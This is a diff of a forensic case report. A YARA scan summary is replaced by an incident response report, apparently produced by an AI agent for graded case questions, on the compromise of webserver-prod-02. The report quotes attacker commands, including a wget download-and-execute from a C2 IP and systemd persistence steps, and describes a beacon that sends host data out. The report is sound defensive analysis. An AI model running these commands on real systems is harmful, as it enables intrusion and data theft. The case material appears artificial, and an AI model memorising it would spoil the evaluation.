@@ -1,30 +1,61 @@
-The audit confirms `yara_scan_files` was run on all six disk images. The remaining tools (fls, bulk_extractor, mmls, plaso, steganography, optical_listing) are not required for this YARA-focused case.
+All 9 claims accepted. Here is the final report.
 
 ---
 
-# Forensic Report — Case nist-dfr-six-yara
+# Incident Response Report — webserver-prod-02
 
-## Evidence Summary
+## Executive Summary
 
-Six removable-drive disk images were provided at `/evidence/nist-cftt-dfr-six`:
+The host **webserver-prod-02** was compromised. An attacker gained command execution as `www-data` (likely via web application exploitation), downloaded and executed malware from C2 server `185.229.59.103`, then pivoted to the `deploy` account via SSH. Using deploy's overly permissive NOPASSWD sudo access to `systemctl`, the attacker installed a persistent C2 beacon as a systemd service running as root. The attacker also performed anti-forensics by clearing deploy's shell history.
 
-| # | Image File | Type | Size |
-|---|-----------|------|------|
-| 1 | dfr-01-fat.dd | FAT disk image | 1.0 GB |
-| 2 | dfr-02-ntfs.dd | NTFS disk image | 1.0 GB |
-| 3 | dfr-03-ntfs.dd | NTFS disk image | 1.0 GB |
-| 4 | dfr-04-fat.dd | FAT disk image | 1.0 GB |
-| 5 | dfr-05-ntfs.dd | NTFS disk image | 1.0 GB |
-| 6 | dfr-06-fat.dd | FAT disk image | 1.0 GB |
+## Attack Timeline
 
-## Analysis Performed
+| Time (Apr 2026) | Event | Source |
+|---|---|---|
+| **Unknown** | Attacker gains command execution as `www-data`, runs recon (`id`, `uname -a`), downloads malware from `http://185.229.59.103/u` to `/tmp/.u`, executes it, reads `/etc/passwd` | `fs/var/www/.bash_history` |
+| **Apr 14, 03:17:44** | Attacker logs into `deploy` via SSH publickey from `185.229.59.103` | `auth.log:30` |
+| **Apr 14, 03:18:02** | `sudo cat /etc/passwd` — credential/config reconnaissance | `auth.log:32` |
+| **Apr 14, 03:18:12** | `sudo cp /tmp/update /usr/local/bin/update` — staged a binary | `auth.log:35` |
+| **Apr 14, 03:18:17** | `sudo chmod +x /usr/local/bin/update` | `auth.log:36` |
+| **Apr 14, 03:18:29** | `sudo tee /etc/systemd/system/system-updater.service` — created malicious systemd unit | `auth.log:37` |
+| **Apr 14, 03:18:44** | `sudo systemctl daemon-reload` | `auth.log:38` |
+| **Apr 14, 03:18:58** | `sudo systemctl enable system-updater.service` — persistence enabled | `auth.log:39` |
+| **Apr 14, 03:19:03** | `sudo systemctl start system-updater.service` — beacon activated | `auth.log:40` |
+| **Apr 14, 03:20:51** | Attacker SSH session closed | `auth.log:41` |
 
-Each disk image was scanned with `yara_scan_files` using the built-in Neo23x0/signature-base ruleset (~4,000 rules). Every scan completed successfully and returned **zero rule matches**.
+## Key Findings
 
-## Tool Coverage
+### 1. Malicious Persistence (CONFIRMED)
+A systemd unit `system-updater.service` was installed that runs as root and beacons to `https://185.229.59.103:8443/beacon` every 600 seconds, exfiltrating the hostname and IP address. This service was enabled and started during the attacker session.
 
-The `audit_tool_coverage` check confirms `yara_scan_files` was executed against all six evidence items. Other applicable disk-image tools (fls, bulk_extractor, mmls, plaso, steganography detection, optical listing) were intentionally skipped as they fall outside the scope of this YARA-only scan assignment.
+### 2. www-data Shell History Shows Attacker Activity (CONFIRMED)
+The file `fs/var/www/.bash_history` (the www-data account's history) contains 7 commands showing clear post-exploitation: system recon, malware download from the C2, execution of a hidden payload (`/tmp/.u`), and reading `/etc/passwd`.
+
+### 3. Deploy Account Compromise (CONFIRMED)
+The `deploy` account was accessed from the C2 IP `185.229.59.103` via SSH publickey authentication on Apr 14 at 03:17:44. No failed logins preceded it — the attacker had a valid key.
+
+### 4. Anti-Forensics — History Tampering (INFERENCE)
+Deploy's `.bash_history` contains only 15 benign CI/CD commands and none of the 9 malicious sudo commands recorded in auth.log. The attacker likely cleared or suppressed shell history recording.
+
+### 5. Dangerous Sudoers Configuration (CONFIRMED)
+The deploy account has `NOPASSWD` sudo access to bare `/usr/bin/systemctl`, allowing installation and execution of arbitrary systemd services as root. This was the privilege escalation vector.
+
+### 6. C2 IP — 185.229.59.103 (CONFIRMED)
+Identified as a C2 server (high confidence). Used both for malware hosting (HTTP on port 80) and beacon collection (HTTPS on port 8443).
+
+## Indicators of Compromise
+
+| Type | Value | Context |
+|---|---|---|
+| IP | `185.229.59.103` | C2 server — SSH login source, malware host, beacon destination |
+| URL | `http://185.229.59.103/u` | Malware download URL |
+| URL | `https://185.229.59.103:8443/beacon` | C2 beacon endpoint |
+| File | `/tmp/.u` | Downloaded malware (hidden dot-file in /tmp) |
+| File | `/usr/local/bin/update` | Staged binary copied from `/tmp/update` |
+| File | `/etc/systemd/system/system-updater.service` | Malicious persistence unit |
 
 ## Case Questions
 
-Case Q1: All six disk images were scanned with `yara_scan_files` using the built-in signature-base ruleset. The images scanned were: **dfr-01-fat.dd**, **dfr-02-ntfs.dd**, **dfr-03-ntfs.dd**, **dfr-04-fat.dd**, **dfr-05-ntfs.dd**, and **dfr-06-fat.dd**. No YARA rules matched on any of the six images — every scan returned 0 hits.
+**Case Q1:** Shell histories were analyzed for the following accounts: **root** (4 commands, benign admin activity), **deploy** (15 commands, normal CI/CD activity only), **alice** (6 commands, benign log-review activity), and **www-data** (`/var/www/.bash_history`, 7 commands, highly suspicious attacker activity). **Bob** had no `.bash_history` file present in the evidence despite having a valid login shell and two SSH sessions in the auth log.
+
+**Case Q2:** Yes — the **www-data** account's shell history (`fs/var/www/.bash_history`) shows what the attacker did: they ran system reconnaissance (`id`, `uname -a`), downloaded malware from the C2 server (`wget http://185.229.59.103/u -O /tmp/.u`), made it executable (`chmod +x /tmp/.u`), ran it in the background (`/tmp/.u &`), and read the system's password file (`cat /etc/passwd`). Additionally, while **deploy's** `.bash_history` does not contain the attacker's commands (evidence of history tampering), the **auth.log** sudo records (lines 32–40) fully document the attacker's actions during the deploy session: reading `/etc/passwd`, staging a binary, and installing/enabling/starting the malicious `system-updater.service` persistence mechanism.
